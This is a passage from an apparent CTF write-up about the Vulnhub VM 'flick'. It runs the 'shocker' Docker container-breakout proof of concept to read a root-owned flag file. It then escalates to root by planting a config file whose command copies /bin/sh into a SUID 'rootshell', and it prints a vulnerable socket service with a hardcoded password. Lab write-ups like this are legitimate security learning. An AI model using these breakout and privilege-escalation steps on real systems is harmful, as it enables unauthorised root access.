<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>docker build -t shocker/shocker shocker/
</span><span class='line'>Uploading context 101.9 kB
</span><span class='line'>Uploading context
</span><span class='line'>Step <span class="m">0</span> : FROM ubuntu
</span><span class='line'> ---&gt; ba5877dc9bec
</span><span class='line'>Step <span class="m">1</span> : RUN apt-get update <span class="o">&amp;&amp;</span> apt-get install -yq build-essential
</span><span class='line'> ---&gt; Using cache
</span><span class='line'> ---&gt; fe0bdac7e278
</span><span class='line'>Step <span class="m">2</span> : ADD . /app
</span><span class='line'> ---&gt; 218b0633106e
</span><span class='line'>Removing intermediate container 2a354d2d7c4b
</span><span class='line'>Step <span class="m">3</span> : WORKDIR /app
</span><span class='line'> ---&gt; Running in 957ed6b77fb3
</span><span class='line'> ---&gt; bbcee63e4d51
</span><span class='line'>Removing intermediate container 957ed6b77fb3
</span><span class='line'>Step <span class="m">4</span> : RUN cc -Wall -std<span class="o">=</span>c99 -O2 shocker.c -static -Wno-unused-result -o shocker
</span><span class='line'> ---&gt; Running in e283824b6a69
</span><span class='line'> ---&gt; 7e02f111f1eb
</span><span class='line'>Removing intermediate container e283824b6a69
</span><span class='line'>Step <span class="m">5</span> : CMD <span class="o">[</span><span class="s2">&quot;./shocker&quot;</span><span class="o">]</span>
</span><span class='line'> ---&gt; Running in ef8d73127be9
</span><span class='line'> ---&gt; f532278bdca2
</span><span class='line'>Removing intermediate container ef8d73127be9
</span><span class='line'>Successfully built f532278bdca2
</span><span class='line'>robin@flick:~<span class="nv">$ </span>docker run shocker/shocker
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> docker VMM-container breakout Po<span class="o">(</span>C<span class="o">)</span> <span class="m">2014</span>             <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> The tea from the 90<span class="s1">&#39;s kicks your sekurity again.     [***]</span>
</span><span class='line'><span class="s1">[***] If you have pending sec consulting, I&#39;</span>ll happily     <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> forward to my friends who drink secury-tea too!      <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found mnt
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found home
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found root
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: root <span class="nv">ino</span><span class="o">=</span>130833
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>root<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .bashrc
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .Xauthority
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc <span class="nv">ino</span><span class="o">=</span>138648
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;random.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found real_flag.txt
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found ..
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> Cannot find valid handle!: Bad file descriptor
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Our flag is actually called real_flag.txt, so a quick edit, compile and run, and we have the flag !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">find_handle</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="s">&quot;/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">root_h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">h</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>docker build -t shocker/shocker shocker/
</span><span class='line'>Uploading context 101.9 kB
</span><span class='line'>Uploading context
</span><span class='line'>Step <span class="m">0</span> : FROM ubuntu
</span><span class='line'> ---&gt; ba5877dc9bec
</span><span class='line'>Step <span class="m">1</span> : RUN apt-get update <span class="o">&amp;&amp;</span> apt-get install -yq build-essential
</span><span class='line'> ---&gt; Using cache
</span><span class='line'> ---&gt; fe0bdac7e278
</span><span class='line'>Step <span class="m">2</span> : ADD . /app
</span><span class='line'> ---&gt; c70bb87b476f
</span><span class='line'>Removing intermediate container 9dc4cbb04db9
</span><span class='line'>Step <span class="m">3</span> : WORKDIR /app
</span><span class='line'> ---&gt; Running in 77dfcfa2bdd0
</span><span class='line'> ---&gt; e376b09e495d
</span><span class='line'>Removing intermediate container 77dfcfa2bdd0
</span><span class='line'>Step <span class="m">4</span> : RUN cc -Wall -std<span class="o">=</span>c99 -O2 shocker.c -static -Wno-unused-result -o shocker
</span><span class='line'> ---&gt; Running in 6d5d7089896d
</span><span class='line'> ---&gt; f3140f828bfc
</span><span class='line'>Removing intermediate container 6d5d7089896d
</span><span class='line'>Step <span class="m">5</span> : CMD <span class="o">[</span><span class="s2">&quot;./shocker&quot;</span><span class="o">]</span>
</span><span class='line'> ---&gt; Running in 481824a260cb
</span><span class='line'> ---&gt; 2c7032dcfbd2
</span><span class='line'>Removing intermediate container 481824a260cb
</span><span class='line'>Successfully built 2c7032dcfbd2
</span><span class='line'>robin@flick:~<span class="nv">$ </span>docker run shocker/shocker
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> docker VMM-container breakout Po<span class="o">(</span>C<span class="o">)</span> <span class="m">2014</span>             <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> The tea from the 90<span class="s1">&#39;s kicks your sekurity again.     [***]</span>
</span><span class='line'><span class="s1">[***] If you have pending sec consulting, I&#39;</span>ll happily     <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> forward to my friends who drink secury-tea too!      <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found mnt
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found home
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found root
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: root <span class="nv">ino</span><span class="o">=</span>130833
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>root<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .bashrc
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .Xauthority
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc <span class="nv">ino</span><span class="o">=</span>138648
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;real_flag.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found real_flag.txt
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: real_flag.txt <span class="nv">ino</span><span class="o">=</span>165015
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>real_flag.txt<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x97, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Got a final handle!
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x97, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Win! /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc output follows:
</span><span class='line'>Congrats!
</span><span class='line'>
</span><span class='line'>You have completed <span class="s1">&#39;flick&#39;</span>! I hope you have enjoyed doing it as much as I did creating it
</span><span class='line'>
</span><span class='line'>ciao <span class="k">for</span> now!
</span><span class='line'>@leonjza
</span><span class='line'>
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://stream1.gifsoup.com/webroot/animatedgifs/1024795_o.gif" alt="" /></p>

<hr />

<h2>I&rsquo;m Always After the Bonus Points</h2>

<p>So, on Vulnhub, the text for Flick has this line in it</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>As a bonus, can you get root command execution?
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/challenge_accepted.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/challenge_accepted.jpg" alt="challenge_accepted" /></a></p>

<p>Using the aforementioned Docker Container Breakout vulnerability, I read the contents of /opt/start_apache/restart.sh</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>/usr/sbin/service apache2 restart
</span><span class='line'>/usr/bin/supervisorctl restart all
</span></code></pre></td></tr></table></div></figure>


<p>OK, so, it&rsquo;s restarting apache and restarting all processes controlled by Supervisord. Supervisord stores config files in /etc/supervisor/conf.d. Using the Docker vuln to blind enumerate the files, I located /etc/supervisor/conf.d/start_apache.conf which I read</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>[program:start_apache]
</span><span class='line'>command=/opt/start_apache/start.py
</span><span class='line'>process_name = %(program_name)s-80%(process_num)02d
</span><span class='line'>stdout_logfile = /var/log/start_apache-80%(process_num)02d.log
</span><span class='line'>stdout_logfile_maxbytes=100MB
</span><span class='line'>stdout_logfile_backups=10
</span><span class='line'>numprocs=1
</span><span class='line'>directory=/opt/start_apache
</span><span class='line'>stopwaitsecs=1
</span><span class='line'>user=root
</span><span class='line'>stopasgroup=true
</span></code></pre></td></tr></table></div></figure>


<p>/usr/bin/supervisorctl restart all is running /opt/start_apache/start.py. That&rsquo;s the next file I read with the Docker vuln</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">    Simple socket server using threads. Used in the flick CTF</span>
</span><span class='line'><span class="sd">    Credit: http://www.binarytides.com/python-socket-server-code-example/</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">signal</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">thread</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">subprocess</span>
</span><span class='line'>
</span><span class='line'><span class="c"># import the directory containing our config, and prevent the bytcode writes</span>
</span><span class='line'><span class="n">sys</span><span class="o">.</span><span class="n">dont_write_bytecode</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>
</span><span class='line'><span class="c"># see if /tmp has a configuration to load.</span>
</span><span class='line'><span class="c"># Debugging purposes only!!!</span>
</span><span class='line'><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s">&#39;/tmp/config.py&#39;</span><span class="p">):</span>
</span><span class='line'>  <span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;/tmp&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>  <span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;/etc&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># import the config</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">config</span> <span class="kn">import</span> <span class="n">config</span>
</span><span class='line'>
</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>   <span class="c"># Symbolic name meaning all available interfaces</span>
</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">8881</span> <span class="c"># Arbitrary non-privileged port</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Bind socket to local host and port</span>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span><span class='line'><span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span> <span class="k">as</span> <span class="n">msg</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Bind failed. Error Code : &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">&#39; Message &#39;</span> <span class="o">+</span> <span class="n">msg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Start listening on socket</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Function for handling connections. This will be used to create threads</span>
</span><span class='line'><span class="k">def</span> <span class="nf">clientthread</span><span class="p">(</span><span class="n">conn</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c">#Sending message to connected client</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;Welcome to the admin server. A correct password will </span><span class="se">\&#39;</span><span class="s">flick</span><span class="se">\&#39;</span><span class="s"> the switch and open a new door:</span><span class="se">\n</span><span class="s">&gt; &#39;</span><span class="p">)</span> <span class="c">#send only takes string</span>
</span><span class='line'>
</span><span class='line'>    <span class="c">#infinite loop so that function do not terminate and thread do not end.</span>
</span><span class='line'>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>        <span class="c">#Receiving from client</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>        <span class="n">reply</span> <span class="o">=</span> <span class="s">&#39;OK: &#39;</span> <span class="o">+</span> <span class="n">data</span>
</span><span class='line'>        <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># check if the password is tabupJievas8Knoj</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s">&#39;tabupJievas8Knoj&#39;</span><span class="p">:</span>
</span><span class='line'>      <span class="n">return_code</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">&#39;command&#39;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">return_code</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">reply</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">Accepted! The door should be open now :poolparty:</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span>
</span><span class='line'>          <span class="n">reply</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">Accepted, but it doesn</span><span class="se">\&#39;</span><span class="s">t look like the door opened :&lt;</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># add the prompt again</span>
</span><span class='line'>  <span class="n">reply</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&gt; &#39;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">reply</span><span class="p">)</span>
</span><span class='line'>    <span class="c">#came out of loop</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c">#now keep talking with the client</span>
</span><span class='line'><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>    <span class="c">#wait to accept a connection - blocking call</span>
</span><span class='line'>    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="c">#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.</span>
</span><span class='line'>    <span class="n">start_new_thread</span><span class="p">(</span><span class="n">clientthread</span> <span class="p">,(</span><span class="n">conn</span><span class="p">,))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This script is the script that provides the service found on port 8881, and seems to get it&rsquo;s config from /tmp/config.py, and if that doesn&rsquo;t exist, /etc/config.py. I read /etc/config.py to get an idea of the syntax</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>  <span class="s">&#39;command&#39;</span><span class="p">:</span> <span class="s">&#39;service apache2 restart&#39;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Pretty simple. I can use this to execute a set of commands by creating /tmp/config.py with the following contents - this will take a copy of /bin/sh and put it in /tmp called rootshell, then set the SUID bit.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>  <span class="s">&#39;command&#39;</span><span class="p">:</span> <span class="s">&#39;cp /bin/sh /tmp/rootshell &amp;&amp; chmod 4777 /tmp/rootshell&#39;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, when I run the /opt/start_apache/restart.sh script, /opt/start_apache/start.py will be run, which will result in /tmp/config.py being read instead of /etc/config.py.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>sudo /opt/start_apache/restart.sh
</span><span class='line'> * Restarting web server apache2                                                                                                                                              apache2: Could not reliably determine the server<span class="s1">&#39;s fully qualified domain name, using 127.0.1.1 for ServerName</span>
</span><span class='line'><span class="s1"> ... waiting apache2: Could not reliably determine the server&#39;</span>s fully qualified domain name, using 127.0.1.1 <span class="k">for</span> ServerName
</span><span class='line'>                                                                                                                                                                       <span class="o">[</span> OK <span class="o">]</span>
</span><span class='line'>start_apache-8000: stopped
</span><span class='line'>start_apache-8000: started
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, we know that typing the correct password runs the command - we know this firstly from the source code, and secondly because we used it to start the web server right at the beginning. All I should need to do is connect to port 8881, and type the correct password. It should then run my malicious command.</p>

